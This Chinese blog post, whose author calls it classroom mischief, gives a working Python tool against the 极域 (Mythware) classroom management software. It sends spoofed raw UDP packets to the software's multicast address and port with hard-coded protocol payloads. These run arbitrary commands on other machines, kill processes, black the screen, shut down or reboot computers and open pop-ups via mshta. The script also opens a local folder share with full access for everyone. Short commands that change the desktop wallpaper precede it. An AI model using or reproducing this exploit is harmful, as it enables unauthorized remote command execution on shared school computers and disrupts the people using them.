<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico"><link rel="icon" href="/favicon.ico"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="Yuhanawa"><meta name="keywords" content=""><meta name="description" content="极域和一些课堂微机捣蛋工具** 上课捣蛋用的 丢人勿看 ** 图片 py -c &quot;import urllib.request; url&#x3D;&#39;https:&#x2F;&#x2F;i0.hdslb.com&#x2F;bfs&#x2F;article&#x2F;085247fd6fefc441ccdc71bd6f08dc1c5b1c708b.png&#39;; urllib.r"><meta property="og:type" content="article"><meta property="og:title" content="临时存放"><meta property="og:url" content="http://yuhanawa.github.io/posts/2022/34068/index.html"><meta property="og:site_name" content="Yuhan &#39;s blog"><meta property="og:description" content="极域和一些课堂微机捣蛋工具** 上课捣蛋用的 丢人勿看 ** 图片 py -c &quot;import urllib.request; url&#x3D;&#39;https:&#x2F;&#x2F;i0.hdslb.com&#x2F;bfs&#x2F;article&#x2F;085247fd6fefc441ccdc71bd6f08dc1c5b1c708b.png&#39;; urllib.r"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2022-10-22T09:14:21.000Z"><meta property="article:modified_time" content="2023-05-02T06:20:00.372Z"><meta property="article:author" content="Yuhanawa"><meta name="twitter:card" content="summary_large_image"><title>临时存放 - Yuhan &#39;s blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/prism/1.26.0/plugins/line-numbers/prism-line-numbers.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/custom.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"yuhanawa.github.io",root:"/",version:"1.9.0",typing:{enable:!0,typeSpeed:70,cursorChar:"",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!1,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:"sbyNAuxQBqjq3uoMduSWbIhb-gzGzoHsz",app_key:"pCKWRQnCJ9vokdYUmvsWlrLw",server_url:"https://sbynauxq.lc-cn-n1-shared.com",path:"window.location.pathname",ignore_local:!0}},search_path:"/local-search.xml"};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 6.2.0"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>Yuhanawa</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档</a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类</a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/default.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="临时存放"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> Yuhanawa </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-10-22 17:14" pubdate>2022年10月22日 下午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 12k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 100 分钟 </span><span id="leancloud-page-views-container" class="post-meta" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="leancloud-page-views"></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 style="display:none">临时存放</h1><div class="markdown-body"><p>极域和一些课堂微机捣蛋工具<br>** 上课捣蛋用的 丢人勿看 **</p><p>图片</p><div class="code-wrapper"><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">py -c &quot;import urllib.request; url&#x3D;&#39;https:&#x2F;&#x2F;i0.hdslb.com&#x2F;bfs&#x2F;article&#x2F;085247fd6fefc441ccdc71bd6f08dc1c5b1c708b.png&#39;; urllib.request.urlretrieve(url, &#39;C:&#x2F;&#x2F;h&#x2F;w.png&#39;)&quot;</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">py -c &quot;import urllib.request; url&#x3D;&#39;https:&#x2F;&#x2F;i0.hdslb.com&#x2F;bfs&#x2F;article&#x2F;085247fd6fefc441ccdc71bd6f08dc1c5b1c708b.png&#39;; urllib.request.urlretrieve(url, &#39;D:&#x2F;&#x2F;wallpaper.png&#39;)&quot;

reg add &quot;HKCU\Control Panel\Desktop&quot; &#x2F;v Wallpaper &#x2F;t REG_SZ &#x2F;d &quot;D:\wallpaper.png&quot; &#x2F;f   

ping 127.0.0.1 -n 1

rundll32.exe user32.dll,UpdatePerUserSystemParameters</code></pre></div><p>脚本</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import socket
import struct
import random
import time

def checksum(data):
    s &#x3D; 0
    n &#x3D; len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+&#x3D;  (data[i]) + ((data[i+1]) &lt;&lt; 8)
    if n:
        s+&#x3D; (data[i+1])
    while (s &gt;&gt; 16):
        s &#x3D; (s &amp; 0xFFFF) + (s &gt;&gt; 16)
    s &#x3D; ~s &amp; 0xffff
    return s

def format16(str):
      l &#x3D; []
      for i in range(len(str)):
        if i % 2 &#x3D;&#x3D;0:
          q &#x3D; int(&#39;0x&#39; + (str[i:i+2]),16)
          l.append(q)
      return l

class UDP(object):
    def __init__(self, destination,sport,dport,data&#x3D;&#39;&#39;):
        super(UDP, self).__init__()
        self.destination &#x3D; destination 
        self.data &#x3D; data 
        self.sport &#x3D;sport
        self.dport &#x3D; dport
        self.length &#x3D; 8+len(data);
        self.checksum &#x3D;0

    def create_udp_header(self,proto&#x3D;socket.IPPROTO_UDP):
        pseudo_header &#x3D; struct.pack(&#39;!4s4sBBH&#39;, socket.inet_aton(socket.gethostbyname(socket.gethostname())), socket.inet_aton(self.destination), 0, proto, self.length)
        self.checksum &#x3D; checksum(pseudo_header)
        udp_header &#x3D; struct.pack(&#39;!HHHH&#39;, self.sport, self.dport, self.length, self.checksum)
        return udp_header
           
    def send(self): 
        try:
            s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        except Exception as e:
            raise e
        data &#x3D; bytes(self.data)
        udp_header &#x3D; struct.pack(&#39;!HHHH&#39;, self.sport, self.dport, self.length, self.checksum)
        packet &#x3D; udp_header+data
        s.sendto(packet, (self.destination, self.dport));
        s.close()
        print(&#39;UDP Send Successful!&#39;)


class Data(object):
    
    def __init__(self, data&#x3D;&#39;&#39;,mydata&#x3D;&#39;&#39;,effect&#x3D;&#39;&#39;,nocmd&#x3D;0,onlyhead&#x3D;0):
        super(Data, self).__init__()
        self.data &#x3D; data
        self.effect &#x3D; effect
        self.nocmd &#x3D; nocmd
        self.onlyhead &#x3D;onlyhead
        self.header &#x3D; &#123;
            #发送消息
            &quot;msg&quot;: &#39;444d4f43000001009e0300001041affba0e7524091dc27a3b6f9292e204e0000c0a850819103000091030000000800000000000005000000&#39;,
            #执行命令
            &quot;cmd&quot;: &#39;444d4f43000001006e030000aa9218a2aa809246b7d5ad545b998dc6204e0000c0a81f0b610300006103000000020000000000000f0000000100000043003a005c00570049004e0044004f00570053005c00730079007300740065006d00330032005c0063006d0064002e00650078006500000000000000&#39;,
            #结束进程
            &quot;kill&quot;: &#39;444d4f43000001002a020000ff520b222a07974684aeb80ea9c3a15c204e0000c0a8c5011d0200001d0200000002000000000000020000100000000001&#39;,
            #结束进程 开始
            &quot;kill_start&quot;: &#39;54524d430000010004000000ff520b222a07974684aeb80ea9c3a15cc0a8c581&#39;,
            #打开文件
            &quot;open&quot;: &#39;444d4f43000001006e0300003593442e858bcc4f9fa7cb5f09c127c0204e0000c0a8c501610300006103000000020000000000000f00000001000000&#39;,
            #黑屏
            &quot;blackscreen&quot;: &#39;4d4553530100000001000000c0a8c58127000000200000000000008001000000010000000a00000000000000ffffff0000000000a00520&#39;,
            #关机
            &quot;reboot&quot;: &#39;444d4f43000001002a020000bf40224e572d3e4f9b6fc18de1eb4f62204e0000c0a850811d0200001d0200000002000000000000130000100f00000001000000000000005965085e065ccd912f54a8608476a18b977b3a670230&#39;,
            #重启
            &quot;shutdown&quot;: &#39;444d4f43000001002a020000c8e397fdc0b59f45877205bd4e46a896204e0000c0a850811d0200001d0200000002000000000000140000100f00000001000000000000005965085e065c7351ed95a8608476a18b977b3a670230&#39;,
            #关闭所有窗口
            &quot;caw&quot;: &#39;444d4f43000001002a0200003dd66ec35ae75ac81b8bad50c5b0ca73204e0000c0a8019b1d0200001d0200000002000000000000020000100f00000001000000000000005965085e065c7351ed95a8608476945e28750b7a8f5e000000000000&#39;,
            #关闭所有窗口 计时
            &quot;caw_time&quot;: &#39;444d4f43000001002a02000088b3b065b0be56f920decdd2d8823e35204e0000c0a8019b1d0200001d0200000002000000000000020000000500000001000000&#39;,
            #关闭顶端窗口
            &quot;ctw&quot;: &#39;444d4f43000001006e0300004e1e91f07b48f68a3cda55563075967a204e0000c0a8019b610300006103000000020000000000000e0000000000000001000000e102020ba615e102020ca9150100112b0000100001000000010000005e010000000000000200000000500000a005000001000000190000004b00000000000000c0a8019b040000000c00000010000000000000002003e001&#39;,
            #签到骚扰
            &quot;sih&quot;: &#39;444d4f430000010026000000e9a680e905af21c1fb06301637bb65ab204e0000c0a8019b190000001900000000020000000000001b00000001000000030000000000&#39;,
            #自定义数据
            &quot;mydata&quot;:mydata,
        &#125;
    def pack(self): 
        data &#x3D; self.pkg_data(self.data)
        payload &#x3D; struct.pack(&quot;%dB&quot; % (len(data)), *data)
        return payload
    
    def format_4byte_send(self,content):
        arr &#x3D; []
        for ch in content:
            tmp &#x3D; &#39;&#39;.join(list(map(lambda x: hex(ord(x)), ch)))
            if int(tmp, 16) &gt; 0xff:
                tmp &#x3D; tmp[2:]
                high &#x3D; int((tmp[0] + tmp[1]), 16)
                low &#x3D; int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
            else:
                high &#x3D; 0
                low &#x3D; int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
        return arr

    def pkg_data(self, content):
        data_header &#x3D; format16(self.header[self.effect])
        
        if len(data_header)&lt;28:
            data_header &#x3D; data_header+ [(0x00) for i in range(28-len(data_header))]
        for i in range(16):
            data_header[12+i]&#x3D;int(random.randint(0,255))
            
        if self.onlyhead&#x3D;&#x3D;1:
            return data_header
            
        data_data &#x3D; self.format_4byte_send(self.data)

        if self.nocmd &#x3D;&#x3D;1:
            header_fill &#x3D;[]
        else:
            header_fill &#x3D; [(0x00) for i in range(572-len(data_header))]

        data_fill &#x3D; [(0x00) for i in range(1440-len(data_header)-len(header_fill)-len(data_data))]
        data &#x3D; data_header + header_fill + data_data +data_fill
        
        return data

# get ip
def get_ip():
    return socket.gethostbyname(socket.gethostname())

# check run.txt is exist, if exist, read run.txt and return string, if not, create run.txt return 0
def read_run():
    import os
    if os.path.exists(&#39;run.txt&#39;):
        with open(&#39;run.txt&#39;, &#39;r&#39;) as f:
            return f.read()
    else:
        with open(&#39;run.txt&#39;, &#39;w&#39;) as f:
            f.write(&#39;0&#39;)
        return &#39;0&#39;

class Main(object):
    def __init__(self):
        super(Main,self).__init__()
        
                
    def main(self,ip,port,message&#x3D;&quot;&quot;,command&#x3D;&quot;&quot;,kill&#x3D;&quot;&quot;,open&#x3D;&quot;&quot;,caw&#x3D;0,ctw&#x3D;0):
        config &#x3D;&#123;
            &quot;ip&quot; : ip,
            &quot;port&quot; : int(port),
            &quot;message&quot; : message,
            &quot;command&quot; : command,
            &quot;time&quot;:0,
            &quot;loop&quot;:1,
            &quot;reboot&quot;:0,
            &quot;shutdown&quot;:0,
            &quot;kill&quot;:kill,
            &quot;open&quot;:open,
            &quot;blackscreen&quot;:0,
            &quot;caw&quot;:caw,
            &quot;ctw&quot;:ctw,
            &quot;sih&quot;:0,
            &quot;sport&quot;:random.randint(1, 65535),
            &quot;mydata&quot;:&quot;&quot;
        &#125;

                
        self.send(config)

    def get_iplist(self,ip):
        ip_list &#x3D; []

        if ip.partition(r&#39;&#x2F;&#39;)[1] &#x3D;&#x3D;&#39;&#x2F;&#39;:
            ip &#x3D; ip.partition(r&#39;&#x2F;&#39;)
        elif ip.partition(r&#39;-&#39;)[1] &#x3D;&#x3D;&#39;-&#39;:
            ip &#x3D; ip.partition(r&#39;-&#39;)

        if len(ip) &gt; 0:
            if  ip[1] &#x3D;&#x3D; &#39;&#x2F;&#39;:
                if  int(ip[2])&lt; 33  and int(ip[2]) &gt; 0:
                    bgn &#x3D; int(ip[0].rpartition(r&#39;.&#39;)[2])
                    end &#x3D; pow(2,(32-int(ip[2])))+1
                    for j in range(bgn,bgn+end):
                        if j &lt; 256:
                            ip_list.append(ip[0].rpartition(r&#39;.&#39;)[0]+&#39;.&#39;+str(j))
            elif  ip[1]&#x3D;&#x3D; &#39;-&#39;:
                for i in range(int(ip[0].rpartition(r&#39;.&#39;)[2]),int(ip[2])+1):
                    if i &lt; 256:
                        ip_list.append(ip[0].rpartition(r&#39;.&#39;)[0]+&#39;.&#39;+str(i))
            else :
                try:
                    socket.inet_aton(ip)
                except socket.error:
                    print(&#39;Invalid IP address.Please try again.&#39;)
                    return
                else:
                    ip_list.append(ip)
        return ip_list
        

    def send(self,config):
        for count in range(int(config[&quot;loop&quot;])):
            for ip in self.get_iplist(config[&quot;ip&quot;]):

                print(f&#39;[time &#123;count+1&#125;]&#39;)

                payload &#x3D; &#123;
                    &quot;message&quot;: Data(data&#x3D;config[&quot;message&quot;],effect&#x3D;&quot;msg&quot;,nocmd&#x3D;1,onlyhead&#x3D;0).pack(),
                    &quot;command&quot;: Data(data&#x3D; r&quot;&#x2F;c &quot;+ config[&quot;command&quot;],effect&#x3D;&quot;cmd&quot;,nocmd&#x3D;0,onlyhead&#x3D;0).pack(),
                    &quot;mydata&quot;: Data(mydata&#x3D;config[&quot;mydata&quot;],effect&#x3D;&quot;mydata&quot;,nocmd&#x3D;1,onlyhead&#x3D;1).pack(),
                    &quot;kill&quot;: Data(mydata&#x3D;config[&quot;kill&quot;],effect&#x3D;&quot;kill&quot;,nocmd&#x3D;1,onlyhead&#x3D;0).pack(),
                    &quot;open&quot;: Data(mydata&#x3D;config[&quot;open&quot;],effect&#x3D;&quot;open&quot;,nocmd&#x3D;1,onlyhead&#x3D;0).pack()
                &#125;
                run &#x3D; &#123;
                    &quot;caw&quot;:Data(data&#x3D;&quot;&quot;,effect&#x3D;&quot;caw&quot;,nocmd&#x3D;0,onlyhead&#x3D;0).pack(),
                    &quot;ctw&quot;:Data(data&#x3D;&quot;&quot;,effect&#x3D;&quot;ctw&quot;,nocmd&#x3D;0,onlyhead&#x3D;0).pack(),
                    &quot;sih&quot;:Data(data&#x3D;&quot;&quot;,effect&#x3D;&quot;sih&quot;,nocmd&#x3D;0,onlyhead&#x3D;0).pack(),
                    &quot;shutdown&quot;:Data(data&#x3D;&quot;&quot;,effect&#x3D;&quot;shutdown&quot;,nocmd&#x3D;0,onlyhead&#x3D;0).pack(),
                    &quot;reboot&quot;:Data(data&#x3D;&quot;&quot;,effect&#x3D;&quot;reboot&quot;,nocmd&#x3D;0,onlyhead&#x3D;0).pack(),
                    &quot;blackscreen&quot;:Data(data&#x3D;&quot;&quot;,effect&#x3D;&quot;blackscreen&quot;,nocmd&#x3D;0,onlyhead&#x3D;0).pack()
                &#125;
                
                for choice in run:
                    if config[choice]:
                        print(&quot;  [%s]&#x3D;&#x3D;&#x3D;&gt;%-16s&quot;%(choice,ip))
                        try:
                            UDP(ip,config[&quot;sport&quot;],config[&quot;port&quot;],run[choice]).send()
                        except Exception as e:
                            print(e)

                for choice in payload:
                    if config[choice]!&#x3D;&#39;&#39;:
                        print(&quot;  [%s]&#x3D;&#x3D;&#x3D;&gt;%-16s&quot;%(choice,ip))
                        try:
                            UDP(ip,config[&quot;sport&quot;],config[&quot;port&quot;],payload[choice]).send()
                        except Exception as e:
                            print(e)

            print(&quot;Sleep for &#123;&#125; s...&quot;.format(config[&quot;time&quot;]))
            time.sleep(config[&quot;time&quot;])
        
        print(&quot;Finish.&quot;)                  



if __name__ &#x3D;&#x3D; &quot;__main__&quot;:

    try:
        import os
        import subprocess

        folder_path &#x3D; &#39;C:&#x2F;h&#39;
        share_name &#x3D; &#39;h&#39;

        # 检查共享文件夹是否存在
        result &#x3D; subprocess.run(f&#39;net share &#123;share_name&#125;&#39;, stdout&#x3D;subprocess.PIPE) 
        share_exists &#x3D; share_name.encode() in result.stdout 

        if not share_exists:
            # 创建共享文件夹
            os.mkdir(folder_path)
            subprocess.run(f&#39;net share &#123;share_name&#125;&#x3D;&#123;folder_path&#125; &#x2F;GRANT:EVERYONE,FULL &#39;) 
    except Exception as e:
        print(e)

    ip &#x3D; &quot;224.50.50.42&quot;
    port &#x3D; &quot;4705&quot;

    # split run.txt(read_run) by &#39;\n&#39; for i in list
    config &#x3D; read_run().split(&quot;---&quot;)
    c &#x3D; config[0]
    if c.strip() !&#x3D; &#39;&#39;:
        for i in c[0].split(&#39;\n&#39;):
            if i.startswith(&#39;#&#39;):
                continue
            elif i.strip() &#x3D;&#x3D; &#39;&#39;:
                continue
            else:
                # 实现以下功能
                # 比如在i中 ip &#x3D; *
                # config[&quot;ip&quot;] &#x3D; *
                kv &#x3D; i.split(&#39;&#x3D;&#39;)
                if len(kv) &lt;&#x3D; 2:
                    continue
                if kv[0].strip() &#x3D;&#x3D; &#39;ip&#39;:
                    if kv[1].strip() &#x3D;&#x3D; &quot;*&quot;:
                        ip &#x3D; &quot;224.50.50.42&quot;
                    elif &#39;.&#39; not in kv[1].strip():
                        ip &#x3D; &#39;.&#39;.join(get_ip().split(&quot;.&quot;).pop()) + &quot;.&quot;+kv[1].strip()
                    else:
                        ip &#x3D; kv[1].strip()
                elif kv[0].strip() &#x3D;&#x3D; &#39;port&#39;:
                    port &#x3D; int(kv[1].strip())

    for i in config[1].split(&#39;\n&#39;):
        if i.startswith(&#39;#&#39;):
            continue
        elif i.strip() &#x3D;&#x3D; &#39;&#39;:
            continue
        else:
            kv &#x3D; i.split(&#39;&#x3D;&#39;)

            if kv[0].strip() &#x3D;&#x3D; &#39;msg&#39;:
                Main().main(ip,port,message&#x3D;kv[1].strip())
            elif kv[0].strip() &#x3D;&#x3D; &#39;cmd&#39;:
                Main().main(ip,port,command&#x3D;kv[1].strip())
            elif kv[0].strip() &#x3D;&#x3D; &#39;kill&#39;:
                Main().main(ip,port,kill&#x3D;kv[1].strip())
            elif kv[0].strip() &#x3D;&#x3D; &#39;open&#39; or kv[0].strip() &#x3D;&#x3D; &#39;run&#39;:
                Main().main(ip,port,open&#x3D;kv[1].strip())
            elif kv[0].strip() &#x3D;&#x3D; &#39;caw&#39;:
                Main().main(ip,port,caw&#x3D;1)
            elif kv[0].strip() &#x3D;&#x3D; &#39;ctw&#39;:
                Main().main(ip,port,ctw&#x3D;1)
            elif kv[0].strip() &#x3D;&#x3D; &#39;web&#39;:
                Main().main(ip,port,command&#x3D;&quot;start &quot; + kv[1].strip())
            elif kv[0].strip() &#x3D;&#x3D; &#39;sc&#39;:
                Main().main(ip,port,command&#x3D;&quot;\\\\&quot; + get_ip() + &quot;\\h\\&quot; + kv[1].strip())
            elif kv[0].strip() &#x3D;&#x3D; &#39;mb&#39;:
                Main().main(ip,port,command&#x3D;f&#39;mshta vbscript:Execute(&quot;msgbox&quot;&quot;&#123;kv[1].strip()&#125;&quot;&quot;:close&quot;)&#39;)
            </code></pre></div></div><hr><div><div class="post-metas my-3"></div><div class="license-box my-3"><div class="license-title"><div>临时存放</div><div>http://yuhanawa.github.io/posts/2022/34068/</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>Yuhanawa</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2022年10月22日</div></div><div class="license-meta-item"><div>许可协议</div><div><a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-by"></i> </span></a><a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><span class="hint--top hint--rounded" aria-label="NC - 非商业性使用"><i class="iconfont icon-nc"></i> </span></a><a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><span class="hint--top hint--rounded" aria-label="SA - 相同方式共享"><i class="iconfont icon-sa"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/posts/2023/28310/" title="砖家建议不要建议&amp;专家都说了些什么"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">砖家建议不要建议&amp;专家都说了些什么</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/posts/2021/39178/" title="配置一个漂亮的 Windows PowerShell | Windows Terminal Preview 美化&amp;个性化"><span class="hidden-mobile">配置一个漂亮的 Windows PowerShell | Windows Terminal Preview 美化&amp;个性化</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments"><div id="valine"></div><script type="text/javascript">Fluid.utils.loadComments("#valine",(function(){Fluid.utils.createScript("https://lib.baomitu.com/valine/1.4.16/Valine.min.js",(function(){var i=Object.assign({appId:"sbyNAuxQBqjq3uoMduSWbIhb-gzGzoHsz",appKey:"pCKWRQnCJ9vokdYUmvsWlrLw",path:"window.location.pathname",placeholder:"发一条友善的评论吧...",avatar:"retro",meta:["nick","mail","link"],requiredFields:[],pageSize:10,lang:"zh-CN",highlight:!0,recordIP:!0,serverURLs:"https://sbynauxq.lc-cn-n1-shared.com",emojiCDN:null,emojiMaps:null,enableQQ:!1},{el:"#valine",path:window.location.pathname});new Valine(i),Fluid.utils.waitElementVisible("#valine .vcontent",()=>{var i="#valine .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(i),Fluid.plugins.fancyBox(i)})}))}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/yuhanawa" target="_blank" rel="nofollow noopener"><span>Yuhanawa</span></a><div style="font-size:smaller"><span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span></div></div><div class="statistics"><span id="leancloud-site-pv-container" style="display:none">总访问量 <span id="leancloud-site-pv"></span> 次 </span><span id="leancloud-site-uv-container" style="display:none">总访客数 <span id="leancloud-site-uv"></span> 人</span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var o=jQuery("#board-ctn").offset().top;window.tocbot.init({tocSelector:"#toc-body",contentSelector:".markdown-body",headingSelector:CONFIG.toc.headingSelector||"h1,h2,h3,h4,h5,h6",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",collapseDepth:CONFIG.toc.collapseDepth||0,scrollSmooth:!0,headingsOffset:-o}),t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))</script><script src="https://lib.baomitu.com/prism/1.26.0/components/prism-core.min.js"></script><script src="https://lib.baomitu.com/prism/1.26.0/plugins/autoloader/prism-autoloader.min.js"></script><script src="https://lib.baomitu.com/prism/1.26.0/plugins/line-numbers/prism-line-numbers.min.js"></script><script>!function(){var e=CONFIG.code_language.enable&&CONFIG.code_language.default,a=CONFIG.copy_btn;if(e||a){var i="";i+='<div class="code-widget">',i+="LANG",i+="</div>",jQuery(".markdown-body pre").each((function(){var n=jQuery(this);if(!(n.find("code.mermaid").length>0||n.find("span.line").length>0)){var t,c="";e&&(c=CONFIG.code_language.default,n[0].children.length>0&&n[0].children[0].classList.length>=2&&n.children().hasClass("hljs")?c=n[0].children[0].classList[1]:n[0].getAttribute("data-language")?c=n[0].getAttribute("data-language"):n.parent().hasClass("sourceCode")&&n[0].children.length>0&&n[0].children[0].classList.length>=2?(c=n[0].children[0].classList[1],n.parent().addClass("code-wrapper")):n.parent().hasClass("markdown-body")&&0===n[0].classList.length&&n.wrap('<div class="code-wrapper"></div>'),c=c.toUpperCase().replace("NONE",CONFIG.code_language.default)),n.append(i.replace("LANG",c).replace('code-widget">',(t=n[0],(Fluid.utils.getBackgroundLightness(t)>=0?"code-widget-light":"code-widget-dark")+(a?' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>':' code-widget">')))),a&&Fluid.utils.createScript("https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js",(function(){new window.ClipboardJS(".copy-btn",{target:function(e){for(var a=e.parentNode.childNodes,i=0;i<a.length;i++)if("CODE"===a[i].tagName)return 